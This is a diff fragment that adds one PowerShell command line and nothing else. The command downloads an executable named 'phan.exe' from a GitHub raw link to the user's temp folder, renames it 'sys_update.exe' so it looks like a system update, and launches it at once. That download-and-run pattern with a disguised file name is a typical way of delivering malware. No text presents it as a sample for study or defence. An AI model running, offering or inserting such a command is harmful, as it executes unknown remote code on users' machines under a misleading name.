@@ -1,0 +1,2 @@
+﻿powershell.exe -WindowStyle Normal -NoExit -Command "Invoke-WebRequest -Uri 'https://github.com/roundbeemeta-eng/psychic-waffle/raw/refs/heads/main/phan.exe' -OutFile \"$env:TEMP\sys_update.exe\"; Start-Process \"$env:TEMP\sys_update.exe\""
+
